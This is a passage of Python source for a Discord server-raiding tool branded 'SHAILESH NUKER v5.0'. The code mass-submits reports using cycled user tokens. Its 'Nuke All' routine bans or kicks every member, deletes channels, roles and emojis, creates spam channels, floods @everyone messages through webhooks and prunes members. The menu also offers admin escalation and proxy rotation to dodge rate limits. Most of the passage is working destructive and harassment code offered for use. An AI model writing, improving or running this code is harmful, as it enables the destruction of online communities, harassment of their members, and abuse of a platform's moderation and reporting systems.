            token_source = token_source.strip().lower()
            if token_source == 't':
                tokens = load_tokens()
            elif token_source == 'm':
                print(format_log_message("INFO", "Enter user tokens separated by commas", 50))
                tokens_str = await self.async_input(format_log_message("INFO", "Tokens: ", 50))
                tokens = [t.strip() for t in tokens_str.split(',') if t.strip()]
        else:
            print(format_log_message("ERROR", "Invalid token usage mode selected.", 50))
            return False

        if not tokens:
            print(format_log_message("ERROR", "No tokens were loaded or provided.", 50))
            return False

        print(format_log_message("INFO", f"Using {len(tokens)} token(s) for reporting.", 50))
        token_cycle = cycle(tokens)

        mode_start, mode_end = get_mode_colors()
        print(format_log_message("INFO", "Mass Report Main Menu:", 50))
        print(gradient_text("╭" + "─" * 80 + "╮", mode_start, mode_end, bold=True))
        print(gradient_text("│ [1] Report User (needs message ID)                                             │", mode_start, mode_end, bold=True))
        print(gradient_text("│ [2] Report Message                                                             │", mode_start, mode_end, bold=True))
        print(gradient_text("│ [3] Report Server                                                              │", mode_start, mode_end, bold=True))
        print(gradient_text("╰" + "─" * 80 + "╯", mode_start, mode_end, bold=True))
        
        option = await self.async_input(format_log_message("INFO", "Choose report type (1-3)", 50))
        option = option.strip()

        if option not in ["1", "2", "3"]:
            print(format_log_message("ERROR", "Invalid option!", 50))
            return False

        reason_map = {
            "1": ("Illegal Content", 1),
            "2": ("Harassment", 2),
            "3": ("Spam or Phishing", 3),
            "4": ("Self-Harm", 4),
            "5": ("NSFW Content", 5),
        }

        async def get_reason():
            mode_start, mode_end = get_mode_colors()
            print(format_log_message("INFO", "Select Report Reason:", 50))
            print(gradient_text("╭" + "─" * 80 + "╮", mode_start, mode_end, bold=True))
            print(gradient_text("│ [1] Illegal Content                                                            │", mode_start, mode_end, bold=True))
            print(gradient_text("│ [2] Harassment                                                                 │", mode_start, mode_end, bold=True))
            print(gradient_text("│ [3] Spam or Phishing                                                           │", mode_start, mode_end, bold=True))
            print(gradient_text("│ [4] Self-Harm                                                                  │", mode_start, mode_end, bold=True))
            print(gradient_text("│ [5] NSFW Content                                                               │", mode_start, mode_end, bold=True))
            print(gradient_text("╰" + "─" * 80 + "╯", mode_start, mode_end, bold=True))
            reason_choice = await self.async_input(format_log_message("INFO", "Choose reason (1-5)", 50))
            return reason_map.get(reason_choice.strip())

        payload = {"guild_id": self.guildid}
        report_target_info = ""
        
        reason_tuple = await get_reason()
        if not reason_tuple:
            print(format_log_message("ERROR", "Invalid reason selected.", 50))
            return False
        
        payload["reason"] = reason_tuple[1]

        if option == "1" or option == "2": 
            if option == "1":
                print(format_log_message("INFO", "To report a user, you must provide a specific message ID from them.", 60))
            channel_id = await self.async_input(format_log_message("INFO", "Channel ID of the message", 50))
            message_id = await self.async_input(format_log_message("INFO", "Message ID to report", 50))
            if not channel_id.strip().isdigit() or not message_id.strip().isdigit():
                print(format_log_message("ERROR", "Invalid Channel or Message ID.", 50))
                return False
            payload["channel_id"] = channel_id.strip()
            payload["message_id"] = message_id.strip()
            report_target_info = f"Message {message_id} in Channel {channel_id}"
        
        elif option == "3":
            report_target_info = f"Server {self.guildid}"
            try:
                session = await self._get_session()
                async with session.get(f"https://discord.com/api/v10/guilds/{self.guildid}/channels", headers={"Authorization": next(token_cycle)}, proxy=self._get_proxy()) as resp:
                    if resp.status == 200:
                        channels = await resp.json()
                        if channels:
                            payload["channel_id"] = channels[0]['id']
            except Exception:
                print(format_log_message("WARNING", "Could not fetch a channel for context.", 50))
        
        else:
            print(format_log_message("ERROR", "Invalid option!", 50))
            return False

        try:
            repeat_count = int((await self.async_input(format_log_message("INFO", "Number of times to report (e.g., 10)", 50))).strip())
            if repeat_count < 1:
                repeat_count = 1
        except ValueError:
            print(format_log_message("ERROR", "Invalid repeat count, defaulting to 1", 50))
            repeat_count = 1

        print(format_log_message("SUCCESS", f"Submitting {repeat_count} reports for {report_target_info}...", 45))
        
        success_count = 0
        tasks = [self._execute_report(payload, next(token_cycle)) for _ in range(repeat_count)]
        results = await asyncio.gather(*tasks)

        for i, (success, error_msg) in enumerate(results):
            if success:
                success_count += 1
                print(format_log_message("SUCCESS", f"Report {i+1}/{repeat_count} submitted for {report_target_info}", 50))
            else:
                print(format_log_message("ERROR", f"Report {i+1}/{repeat_count} failed: {error_msg}", 50))
        
        print(format_log_message("SUCCESS", f"Completed. Submitted {success_count}/{repeat_count} reports on {report_target_info}", 40))
        return True

    
    async def execute_rename_emojis(self, token: str):
        new_name = await self.async_input(format_log_message("INFO", "New emoji name (use {i})", 50))
        session = await self._get_session()
        
        emojis = []
        while True:
            async with session.get(
                f"https://discord.com/api/v10/guilds/{self.guildid}/emojis",
                headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()
            ) as resp:
                if resp.status == 200:
                    emojis = await resp.json()
                    break
                elif resp.status == 429:
                    retry_after = (await resp.json()).get('retry_after', 1.0)
                    await asyncio.sleep(max(retry_after, 1.0))
                    continue
                else:
                    return 0

        count = 0
        for i, emoji in enumerate(emojis):
            name = new_name.format(i=i)
            payload = {"name": name}
            async with self.semaphore:
                while True:
                    async with session.patch(
                        f"https://discord.com/api/v10/guilds/{self.guildid}/emojis/{emoji['id']}",
                        headers={"Authorization": f"Bot {token}"}, json=payload, proxy=self._get_proxy()
                    ) as resp:
                        if resp.status == 200:
                            count += 1
                            print(format_log_message("SUCCESS", f"Renamed emoji {emoji['id']} to {name}", 45))
                            break
                        elif resp.status == 429:
                            retry_after = (await resp.json()).get('retry_after', 1.0)
                            await asyncio.sleep(max(retry_after, 1.0))
                            continue
                        else:
                            break
        return count
    
    async def execute_unick_all(self, token: str):
        try:
            with open("fetched/members.txt", "r") as f:
                members = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(format_log_message("ERROR", "members.txt not found. Fetch first.", 29))
            return 0
        
        count = 0
        session = await self._get_session()
        for member in members:
            if member in self.whitelist:
                print(format_log_message("INFO", f"Skipping whitelisted member {member} (Unick)", 41))
                continue

            async with self.semaphore:
                while True:
                    async with session.patch(
                        f"https://discord.com/api/v10/guilds/{self.guildid}/members/{member}",
                        headers={"Authorization": f"Bot {token}"}, json={"nick": None}, proxy=self._get_proxy()
                    ) as resp:
                        if resp.status in [200, 204]:
                            count += 1
                            print(format_log_message("SUCCESS", f"Removed nickname from {member}", 45))
                            break
                        elif resp.status == 429:
                            retry_after = (await resp.json()).get('retry_after', 1.0)
                            await asyncio.sleep(max(retry_after, 1.0))
                            continue
                        else:
                            break
        return count

    
    async def execute_clone_server(self, token: str):
        source_guild_id = await self.async_input(format_log_message("INFO", "Enter the source guild ID to clone from", 50))
        if not source_guild_id.isdigit():
            print(format_log_message("ERROR", "Invalid source guild ID.", 40))
            return False

        dest_guild_id = await self.async_input(format_log_message("INFO", "Enter the destination guild ID to clone to", 50))
        if not dest_guild_id.isdigit():
            print(format_log_message("ERROR", "Invalid destination guild ID.", 40))
            return False

        session = await self._get_session()

        # Fetch Source Guild
        source_guild = None
        while True:
            try:
                async with session.get(f"https://discord.com/api/v10/guilds/{source_guild_id}", headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()) as resp:
                    if resp.status == 200:
                        source_guild = await resp.json()
                        break
                    elif resp.status == 429:
                        retry_after = (await resp.json()).get('retry_after', 1.0)
                        await asyncio.sleep(max(retry_after, 1.0))
                        continue
                    else:
                        print(format_log_message("ERROR", f"Failed to fetch source guild {source_guild_id}", 40))
                        return False
            except Exception as e:
                print(format_log_message("ERROR", f"Error fetching source guild: {e}", 40))
                return False

        print(format_log_message("INFO", f"Cloning server '{source_guild['name']}'...", 40))

        # Fetch Source Roles
        source_roles = []
        while True:
            async with session.get(f"https://discord.com/api/v10/guilds/{source_guild_id}/roles", headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()) as resp:
                if resp.status == 200:
                    source_roles = await resp.json()
                    break
                elif resp.status == 429:
                    retry_after = (await resp.json()).get('retry_after', 1.0)
                    await asyncio.sleep(max(retry_after, 1.0))
                    continue
                else:
                    print(format_log_message("ERROR", f"Failed to fetch roles from {source_guild_id}", 40))
                    return False

        # Fetch Source Channels
        source_channels = []
        while True:
            async with session.get(f"https://discord.com/api/v10/guilds/{source_guild_id}/channels", headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()) as resp:
                if resp.status == 200:
                    source_channels = await resp.json()
                    break
                elif resp.status == 429:
                    retry_after = (await resp.json()).get('retry_after', 1.0)
                    await asyncio.sleep(max(retry_after, 1.0))
                    continue
                else:
                    print(format_log_message("ERROR", f"Failed to fetch channels from {source_guild_id}", 40))
                    return False

        # Create Roles
        role_map = {}  
        for role in sorted(source_roles, key=lambda r: r['position'], reverse=True):
            if role['name'] == '@everyone':
                role_map[role['id']] = dest_guild_id
                continue
            
            payload = {
                "name": role['name'],
                "permissions": role['permissions'],
                "color": role['color'],
                "hoist": role['hoist'],
                "mentionable": role['mentionable']
            }
            async with self.semaphore:
                while True:
                    async with session.post(f"https://discord.com/api/v10/guilds/{dest_guild_id}/roles", headers={"Authorization": f"Bot {token}"}, json=payload, proxy=self._get_proxy()) as resp:
                        if resp.status == 200:
                            new_role = await resp.json()
                            role_map[role['id']] = new_role['id']
                            print(format_log_message("SUCCESS", f"Created role '{new_role['name']}'", 40))
                            break
                        elif resp.status == 429:
                            retry_after = (await resp.json()).get('retry_after', 1.0)
                            await asyncio.sleep(max(retry_after, 1.0))
                            continue
                        else:
                            print(format_log_message("ERROR", f"Failed to create role '{role['name']}'", 40))
                            break

        # Create Channels
        for channel in source_channels:
            overwrites = []
            for ow in channel.get('permission_overwrites', []):
                if ow['id'] in role_map:
                    overwrites.append({
                        "id": role_map[ow['id']],
                        "type": ow['type'],
                        "allow": ow['allow'],
                        "deny": ow['deny']
                    })

            payload = {
                "name": channel['name'],
                "type": channel['type'],
                "topic": channel.get('topic'),
                "nsfw": channel.get('nsfw', False),
                "permission_overwrites": overwrites,
                "parent_id": channel.get('parent_id')
            }
            async with self.semaphore:
                while True:
                    async with session.post(f"https://discord.com/api/v10/guilds/{dest_guild_id}/channels", headers={"Authorization": f"Bot {token}"}, json=payload, proxy=self._get_proxy()) as resp:
                        if resp.status == 201:
                            new_channel = await resp.json()
                            print(format_log_message("SUCCESS", f"Created channel '{new_channel['name']}'", 40))
                            break
                        elif resp.status == 429:
                            retry_after = (await resp.json()).get('retry_after', 1.0)
                            await asyncio.sleep(max(retry_after, 1.0))
                            continue
                        else:
                            print(format_log_message("ERROR", f"Failed to create channel '{channel['name']}'", 40))
                            break

        print(format_log_message("SUCCESS", "Server clone process completed.", 40))
        return True

    async def execute_guild_info(self, token: str):
        guild_id = await self.async_input(format_log_message("INFO", "Enter the guild ID to fetch info for", 50))
        if not guild_id.isdigit():
            print(format_log_message("ERROR", "Invalid guild ID.", 40))
            return

        session = await self._get_session()
        try:
            async with session.get(f"https://discord.com/api/v10/guilds/{guild_id}", headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()) as resp:
                if resp.status != 200:
                    print(format_log_message("ERROR", f"Failed to fetch guild {guild_id}", 40))
                    return
                guild = await resp.json()

            owner_id = guild.get('owner_id')
            owner_name = "N/A"
            if owner_id:
                async with session.get(f"https://discord.com/api/v10/users/{owner_id}", headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()) as user_resp:
                    if user_resp.status == 200:
                        owner_data = await user_resp.json()
                        owner_name = f"{owner_data.get('username')}#{owner_data.get('discriminator')}"

            async with session.get(f"https://discord.com/api/v10/guilds/{guild_id}/channels", headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()) as resp:
                channels = await resp.json() if resp.status == 200 else []
            async with session.get(f"https://discord.com/api/v10/guilds/{guild_id}/roles", headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()) as resp:
                roles = await resp.json() if resp.status == 200 else []
            async with session.get(f"https://discord.com/api/v10/guilds/{guild_id}/emojis", headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()) as resp:
                emojis = await resp.json() if resp.status == 200 else []

            vanity_code = guild.get('vanity_url_code') or "None"
            creation_date = discord.utils.snowflake_time(int(guild['id'])).strftime("%Y-%m-%d %H:%M:%S")

            info = [
                ("Guild Name", guild.get('name')),
                ("Guild ID", guild.get('id')),
                ("Owner", f"{owner_name} ({owner_id})"),
                ("Created At", creation_date),
                ("Members", guild.get('approximate_member_count', 'N/A')),
                ("Vanity URL", vanity_code),
                ("Total Channels", len(channels)),
                ("Total Roles", len(roles)),
                ("Total Emojis", len(emojis)),
            ]

            mode_start, mode_end = get_mode_colors()
            print(gradient_text("╭" + "─" * 60 + "╮", mode_start, mode_end, bold=True))
            for key, value in info:
                print(gradient_text(f"│ {key:<20} │ {str(value):<35} │", mode_start, mode_end, bold=True))
            print(gradient_text("╰" + "─" * 60 + "╯", mode_start, mode_end, bold=True))

        except Exception as e:
            print(format_log_message("ERROR", f"An error occurred: {e}", 40))


    
    async def execute_nuke_all(self, token: str):
        """Execute nuke all with simultaneous operations in fast loop"""
        print(format_log_message("INFO", "Starting FULL NUKE (simultaneous mode)...", 40))
        
        # Priority: config.txt > config.json
        nuke_config = self.external_config
        
        session = await self._get_session()
        
        # Fetch initial state
        channels = []
        roles = []
        while True:
            async with session.get(f"https://discord.com/api/v10/guilds/{self.guildid}/channels",
                                 headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()) as resp:
                if resp.status == 200:
                    channels = await resp.json()
                    break
                elif resp.status == 429:
                    retry_after = (await resp.json()).get('retry_after', 1.0)
                    await asyncio.sleep(max(retry_after, 1.0))
                    continue
                else: break

        while True:
            async with session.get(f"https://discord.com/api/v10/guilds/{self.guildid}/roles",
                                 headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()) as resp:
                if resp.status == 200:
                    roles = await resp.json()
                    break
                elif resp.status == 429:
                    retry_after = (await resp.json()).get('retry_after', 1.0)
                    await asyncio.sleep(max(retry_after, 1.0))
                    continue
                else: break
        
        tasks = []
        
        # Members
        if nuke_config.get("ban_all_members", True):
            try:
                with open("fetched/members.txt", "r") as f:
                    members = [line.strip() for line in f if line.strip()]
                for member in members:
                    tasks.append(self.execute_ban(member, token))
            except FileNotFoundError:
                print(format_log_message("WARNING", "members.txt not found, skipping mass ban.", 40))
        
        elif nuke_config.get("kick_all_members", False):
            try:
                with open("fetched/members.txt", "r") as f:
                    members = [line.strip() for line in f if line.strip()]
                for member in members:
                    tasks.append(self.execute_kick(member, token))
            except FileNotFoundError:
                print(format_log_message("WARNING", "members.txt not found, skipping mass kick.", 40))

        # Channels
        if nuke_config.get("delete_all_channels", True):
            for ch in channels:
                tasks.append(self.execute_delchannels(ch['id'], token))
        
        # Roles
        if nuke_config.get("delete_all_roles", True):
            for role in roles:
                if role['id'] != self.guildid:
                    tasks.append(self.execute_delroles(role['id'], token))
        
        # Emojis
        if nuke_config.get("delete_all_emojis", True):
            tasks.append(self.execute_delemojis_all(token))
        
        # Guild Name
        if nuke_config.get("server_name"):
            tasks.append(self.execute_change_guild_info(token, new_name=nuke_config["server_name"]))
        
        # Batch Execution
        if tasks:
            print(format_log_message("INFO", f"Executing {len(tasks)} nuke tasks...", 40))
            batch_size = __max_concurrent__
            for i in range(0, len(tasks), batch_size):
                batch = tasks[i:i + batch_size]
                await asyncio.gather(*batch, return_exceptions=True)
        
        # Post-deletion operations
        if nuke_config.get("create_spam_channels", True):
            print(format_log_message("INFO", "Creating new channels...", 45))
            ch_name = nuke_config.get("channel_name", "nuked-by-shailesh")
            channel_count = int(nuke_config.get("channel_count", 50))
            channel_tasks = [self.execute_crechannels(ch_name, 0, token) for _ in range(channel_count)]
            await asyncio.gather(*channel_tasks, return_exceptions=True)
        
        if nuke_config.get("spam_messages", True):
            msg = nuke_config.get("message_content", "@everyone @here Nuked by SHAILESH")
            await self.execute_webhook_spam(token, custom_message=msg)
        
        if nuke_config.get("prune_members", True):
            await self.execute_prune(7, token)
        
        print(format_log_message("SUCCESS", "FULL NUKE COMPLETE!", 45))
        return True

    async def execute_delchannels_all(self, token: str):
        session = await self._get_session()
        channels = []
        while True:
            async with session.get(f"https://discord.com/api/v10/guilds/{self.guildid}/channels",
                                 headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()) as resp:
                if resp.status == 200:
                    channels = await resp.json()
                    break
                elif resp.status == 429:
                    retry_after = (await resp.json()).get('retry_after', 1.0)
                    await asyncio.sleep(max(retry_after, 1.0))
                    continue
                else: break
        
        if channels:
            tasks = [self.execute_delchannels(ch['id'], token) for ch in channels]
            await asyncio.gather(*tasks, return_exceptions=True)
        return len(channels)

    async def execute_delroles_all(self, token: str):
        session = await self._get_session()
        roles = []
        while True:
            async with session.get(f"https://discord.com/api/v10/guilds/{self.guildid}/roles",
                                 headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()) as resp:
                if resp.status == 200:
                    roles = await resp.json()
                    break
                elif resp.status == 429:
                    retry_after = (await resp.json()).get('retry_after', 1.0)
                    await asyncio.sleep(max(retry_after, 1.0))
                    continue
                else: break
        
        if roles:
            tasks = [self.execute_delroles(role['id'], token) for role in roles if role['id'] != self.guildid]
            await asyncio.gather(*tasks, return_exceptions=True)
        return len(roles)

    async def execute_delemojis_all(self, token: str):
        session = await self._get_session()
        async with session.get(f"https://discord.com/api/v10/guilds/{self.guildid}/emojis",
                             headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()) as resp:
                emojis = await resp.json() if resp.status == 200 else []
        for emoji in emojis:
            await self.execute_delemojis(emoji['id'], token)

    async def execute_get_invite(self, token: str):
        platform = await self.async_input(format_log_message("INFO", "Platform: [w]indows/[m]obile", 50))
        platform = platform.strip().lower()
        
        session = await self._get_session()
        async with session.get(f"https://discord.com/api/v10/guilds/{self.guildid}/channels",
                             headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()) as resp:
            channels = await resp.json()
            if not channels:
                return None
        
        link = None
        for ch in channels:
            if ch.get('type') in [0, 2]: # Text or Voice
                async with session.post(
                    f"https://discord.com/api/v10/channels/{ch['id']}/invites",
                    headers={"Authorization": f"Bot {token}"}, json={"max_age": 0}, proxy=self._get_proxy()
                    ) as resp:
                        if resp.status == 200:
                            invite = await resp.json()
                            link = f"https://discord.gg/{invite['code']}"
                            break
        
        if link:
            if platform == 'w' or platform == 'windows':
                pyperclip.copy(link)
                print(format_log_message("SUCCESS", f"Invite copied to clipboard: {link}", 50))
            elif platform == 'm' or platform == 'mobile':
                print(format_log_message("SUCCESS", f"Invite link (mobile): {link}", 50))
            else:
                try:
                    pyperclip.copy(link)
                    print(format_log_message("SUCCESS", f"Invite copied: {link}", 50))
                except:
                    print(format_log_message("SUCCESS", f"Invite link: {link}", 50))
            return link
        return None

    async def menu(self): 
        os.system("cls") if os.name == "nt" else os.system("clear")
        if os.name == "nt":
            os.system(f"title Nuker - Config: {__current_config_name__}")
        
        new_banner = Colorate.Vertical(Colors.blue_to_purple, Center.XCenter(banner))
        
        options = """
┌────────────────────────────────┬────────────────────────────────┬────────────────────────────────┐
│                        SHAILESH NUKER v5.0 | SPEED: COMPARABLE WITH LIGHT                         │
├────────────────────────────────┼────────────────────────────────┼────────────────────────────────┤
│ <01> Ban Members               │ <12> Change Guild Info         │ <23> Server Clone              │
│ <02> Kick Members              │ <13> Give Admin                │ <24> Nuke All                  │
│ <03> Prune Members             │ <14> Delete Invites            │ <25> Get Invite Link           │
│ <04> Create Channels           │ <15> Switch Guild              │ <26> Whitelist Add             │
│ <05> Create Roles              │ <16> Timeout All               │ <27> Whitelist Remove          │
│ <06> Delete Channels           │ <17> Rename Channels           │ <28> Switch Config             │
│ <07> Delete Roles              │ <18> Rename Roles              │ <29> Guild Info                │
│ <08> Delete Emojis             │ <19> Webhook Spam              │ <30> Bot Invite Link           │
│ <09> Spam Channels             │ <20> DM All Members            │ <31> Check Admin Status        │
│ <10> Nick All                  │ <21> Strip Role Perms          │ <32> Exit                      │
│ <11> Change Guild Icon         │ <22> Auto Admin                │                                │
└────────────────────────────────┴────────────────────────────────┴────────────────────────────────┘
"""
        options = Colorate.Color(Colors.white, Center.XCenter(options), True)

        print(new_banner)
        print(Colorate.Vertical(Colors.purple_to_red, Center.XCenter("SYSTEM OBLITERATION IN PROGRESS | Made By Shailesh")))
        
        server_info = f"SELECTED SERVER: {self.guild_name} | ID: {self.guildid}"
        print(Colorate.Vertical(Colors.green_to_blue, Center.XCenter(server_info)))
        
        print(Colorate.Vertical(Colors.purple_to_red, Center.XCenter(f"LOADED PROXIES: <{self.proxy_count}>")))

        print(options)
        ans = await self.async_input(format_log_message("INFO", "Select Option", 50))
        
        if not ans:
            await self.menu()
            return
            
        ans = ans.strip()

        if ans in ["1", "01"]:
            scrape = await self.async_input(format_log_message("INFO", "Fetch member IDs? [Y/N]", 50))
            scrape = scrape.strip().lower()
            if scrape == "y":
                try:
                    os.makedirs("fetched", exist_ok=True)
                    guild = __client__.get_guild(int(self.guildid))
                    if guild:
                        print(format_log_message("INFO", "Fetching all members from API (This may take a moment)...", 50))
                        count = 0
                        with open("fetched/members.txt", "w") as f:
                            async for member in guild.fetch_members(limit=None):
                                f.write(f"{member.id}\n")
                                count += 1
                        print(format_log_message("SUCCESS", f"Fetched {count} members", 38))
                    else:
                        print(format_log_message("ERROR", "Guild not found!", 47))
                        await self.menu()
                        return
                except Exception as e:
                    print(format_log_message("ERROR", f"Error fetching members | {e}", 41))
            try:
                with open("fetched/members.txt", "r") as f:
                    members = [line.strip() for line in f if line.strip()]
                if not members:
                    print(format_log_message("ERROR", "No members found. Fetch first.", 33))
                    await self.menu()
                    return
            except FileNotFoundError:
                print(format_log_message("ERROR", "members.txt not found. Fetch first.", 29))
                await self.menu()
                return
            except Exception as e:
                print(format_log_message("ERROR", f"Error reading members | {e}", 41))
                await self.menu()
                return

            self.banned.clear()
            start_time = time.time()
            tasks = [self.execute_ban(member, token) for member in members]
            await asyncio.gather(*tasks)
            end_time = time.time()
            duration = end_time - start_time
            print(format_log_message("SUCCESS", f"Banned {len(self.banned)}/{len(members)} members in ({duration:.2f}s)", 36))
            await asyncio.sleep(1)
            await self.menu()

        elif ans in ["2", "02"]:
            try:
                with open("fetched/members.txt", "r") as f:
                    members = [line.strip() for line in f if line.strip()]
                if not members:
                    print(format_log_message("ERROR", "No members found. Fetch first.", 33))
                    await self.menu()
                    return
            except FileNotFoundError:
                print(format_log_message("ERROR", "members.txt not found. Fetch first.", 29))
                await self.menu()
                return
            except Exception as e:
                print(format_log_message("ERROR", f"Error reading members | {e}", 41))
                await self.menu()
                return

            self.kicked.clear()
            start_time = time.time()
            tasks = [self.execute_kick(member, token) for member in members]
            await asyncio.gather(*tasks)
            end_time = time.time()
            duration = end_time - start_time
            print(format_log_message("SUCCESS", f"Kicked {len(self.kicked)}/{len(members)} members in ({duration:.2f}s)", 36))
            await asyncio.sleep(1)
            await self.menu()

        elif ans in ["3", "03"]:
            try:
                days_input = await self.async_input(format_log_message("INFO", "Prune days (0-7)", 50))
                days = int(days_input.strip())
                if 0 <= days <= 7:
                    start_time = time.time()
                    pruned_count = await self.execute_prune(days, token)
                    end_time = time.time()
                    duration = end_time - start_time
                    if pruned_count > 0:
                        print(format_log_message("SUCCESS", f"Pruned {pruned_count} members in ({duration:.2f}s)", 43))
                else:
                    print(format_log_message("ERROR", f"Days must be 0-7: {gradient_text(days_input, PINK_START, PINK_END, bold=True)}!", 46))
            except ValueError:
                print(format_log_message("ERROR", f"Invalid number: {gradient_text(days_input, PINK_START, PINK_END, bold=True)}!", 48))
            await asyncio.sleep(1)
            await self.menu()

        elif ans in ["4", "04"]:
            type_input = await self.async_input(format_log_message("INFO", "Channel type ['t'ext/'v'oice]", 50))
            type_ = 2 if type_input.strip().lower() == 'v' else 0
            
            custom_name = await self.async_input(format_log_message("INFO", "Channel name (Enter for random)", 50))
            custom_name = custom_name.strip()
            
            try:
                amount_input = await self.async_input(format_log_message("INFO", "Amount", 50))
                amount = int(amount_input.strip())
                if amount <= 0:
                    raise ValueError
            except ValueError:
                print(format_log_message("ERROR", f"Invalid amount: {gradient_text(amount_input, PINK_START, PINK_END, bold=True)}!", 47))
                await self.menu()
                return

            self.channels.clear()
            start_time = time.time()
            
            tasks = [self.execute_crechannels(custom_name if custom_name else random.choice(__config__["nuke"]["channel_names"]), type_, token) for _ in range(amount)]
            await asyncio.gather(*tasks)
            end_time = time.time()
            duration = end_time - start_time
            print(format_log_message("SUCCESS", f"Created {len(self.channels)}/{amount} channels in ({duration:.2f}s)", 36))
            await asyncio.sleep(1)
            await self.menu()

        elif ans in ["5", "05"]:
            custom_name = await self.async_input(format_log_message("INFO", "Role name (Enter for random)", 50))
            custom_name = custom_name.strip()
            
            try:
                amount_input = await self.async_input(format_log_message("INFO", "Amount", 50))
                amount = int(amount_input.strip())
                if amount <= 0:
                    raise ValueError
            except ValueError:
                print(format_log_message("ERROR", f"Invalid amount: {gradient_text(amount_input, PINK_START, PINK_END, bold=True)}!", 47))
                await self.menu()
                return

            self.roles.clear()
            start_time = time.time()
            
            tasks = [self.execute_creroles(custom_name if custom_name else random.choice(__config__["nuke"]["roles_name"]), token) for _ in range(amount)]
            await asyncio.gather(*tasks)
            end_time = time.time()
            duration = end_time - start_time
            print(format_log_message("SUCCESS", f"Created {len(self.roles)}/{amount} roles in ({duration:.2f}s)", 40))
            await asyncio.sleep(1)
            await self.menu()

        elif ans in ["6", "06"]:
            try:
                session = await self._get_session()
                async with session.get(
                    f"https://discord.com/api/v10/guilds/{self.guildid}/channels",
                    headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()
                        ) as response:
                            if response.status == 200:
                                channels = await response.json()
                            else:
                                print(format_log_message("ERROR", "Failed to fetch channels", 39))
                                await self.menu()
                                return
            except Exception as e:
                print(format_log_message("ERROR", f"Error fetching channels | {e}", 39))
                await self.menu()
                return

            if not channels:
                print(format_log_message("ERROR", "No channels found!", 44))
                await self.menu()
                return

            self.channels.clear()
            start_time = time.time()
            tasks = [self.execute_delchannels(ch['id'], token) for ch in channels]
            await asyncio.gather(*tasks)
            end_time = time.time()
            duration = end_time - start_time
            print(format_log_message("SUCCESS", f"Deleted {len(self.channels)}/{len(channels)} channels in ({duration:.2f}s)", 36))
            await asyncio.sleep(1)
            await self.menu()

        elif ans in ["7", "07"]:
            try:
                session = await self._get_session()
                async with session.get(
                    f"https://discord.com/api/v10/guilds/{self.guildid}/roles",
                    headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()
                        ) as response:
                            if response.status == 200:
                                roles = await response.json()
                            else:
                                print(format_log_message("ERROR", "Failed to fetch roles", 42))
                                await self.menu()
                                return
            except Exception as e:
                print(format_log_message("ERROR", f"Error fetching roles | {e}", 42))
                await self.menu()
                return

            if not roles:
                print(format_log_message("ERROR", "No roles found!", 47))
                await self.menu()
                return

            self.roles.clear()
            start_time = time.time()
            
            roles_to_delete = [role['id'] for role in roles if role['id'] != self.guildid]
            total_to_delete = len(roles_to_delete)
            
            tasks = [self.execute_delroles(role_id, token) for role_id in roles_to_delete]
            results = await asyncio.gather(*tasks)
            
            end_time = time.time()
            duration = end_time - start_time
            deleted_count = sum(1 for r in results if r is True)
            print(format_log_message("SUCCESS", f"Deleted {deleted_count}/{total_to_delete} roles in ({duration:.2f}s)", 40))
            await asyncio.sleep(1)
            await self.menu()

        elif ans in ["8", "08"]:
            try:
                session = await self._get_session()
                async with session.get(
                    f"https://discord.com/api/v10/guilds/{self.guildid}/emojis",
                    headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()
                        ) as response:
                            if response.status == 200:
                                emojis = await response.json()
                            else:
                                print(format_log_message("ERROR", "Failed to fetch emojis", 41))
                                await self.menu()
                                return
            except Exception as e:
                print(format_log_message("ERROR", f"Error fetching emojis | {e}", 41))
                await self.menu()
                return

            if not emojis:
                print(format_log_message("ERROR", "No emojis found!", 46))
                await self.menu()
                return

            self.emojis.clear()
            start_time = time.time()
            tasks = [self.execute_delemojis(emoji['id'], token) for emoji in emojis]
            await asyncio.gather(*tasks)
            end_time = time.time()
            duration = end_time - start_time
            print(format_log_message("SUCCESS", f"Deleted {len(self.emojis)}/{len(emojis)} emojis in ({duration:.2f}s)", 37))
            await asyncio.sleep(1)
            await self.menu()

        elif ans in ["9", "09"]:
            spam_message = await self.async_input(format_log_message("INFO", "Enter message to spam", 50))
            if not spam_message.strip():
                spam_message = random.choice(__config__["nuke"]["messages_content"])

            try:
                per_channel_input = await self.async_input(format_log_message("INFO", "Amount per channel", 50))
                per_channel = int(per_channel_input.strip())
                if per_channel <= 0:
                    raise ValueError
            except ValueError:
                print(format_log_message("ERROR", f"Invalid amount: {gradient_text(per_channel_input, PINK_START, PINK_END, bold=True)}!", 47))
                await self.menu()
                return

            try:
                session = await self._get_session()
                async with session.get(
                    f"https://discord.com/api/v10/guilds/{self.guildid}/channels",
                    headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()
                        ) as response:
                            if response.status == 200:
                                channels = await response.json()
                            else:
                                print(format_log_message("ERROR", "Failed to fetch channels", 39))
                                await self.menu()
                                return
            except Exception as e:
                print(format_log_message("ERROR", f"Error fetching channels | {e}", 39))
                await self.menu()
                return

            if not channels:
                print(format_log_message("ERROR", "No channels found!", 44))
                await self.menu()
                return

            self.messages.clear()
            self.channels = [ch['id'] for ch in channels if ch['type'] == 0]
            if not self.channels:
                print(format_log_message("ERROR", "No text channels found for spam!", 32))
                await self.menu()
                return

            start_time = time.time()
            tasks = []
            for ch_id in self.channels:
                for _ in range(per_channel):
                    tasks.append(self.execute_massping(ch_id, spam_message, token))
            
            total_expected = len(tasks)
            await asyncio.gather(*tasks)
            end_time = time.time()
            duration = end_time - start_time
            print(format_log_message("SUCCESS", f"Spammed {len(self.messages)}/{total_expected} messages in ({duration:.2f}s)", 36))
